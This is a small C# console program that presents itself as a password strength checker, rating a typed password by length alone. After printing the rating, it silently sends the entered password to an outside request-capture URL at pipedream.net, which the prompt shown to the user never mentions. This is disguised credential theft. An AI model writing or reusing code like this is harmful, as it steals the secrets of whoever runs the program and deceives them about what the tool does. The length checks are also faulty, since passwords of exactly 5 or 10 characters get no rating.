using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Web;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            string URL = "https://en9nxtpjdwglr.x.pipedream.net/";
            Console.WriteLine("Password checker please enter a password to see how strong it is below:");
            string password = Console.ReadLine();

            if(password.Length < 5)
            {
                Console.WriteLine("Weak");
            }else if(password.Length > 5 && password.Length < 10)
            {
                Console.WriteLine("Medium");
            }else if (password.Length > 10)
            {
                Console.WriteLine("Strong");
            }

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(URL + "password:" + HttpUtility.UrlEncode(password));
            req.GetResponse();
        }
    }
}
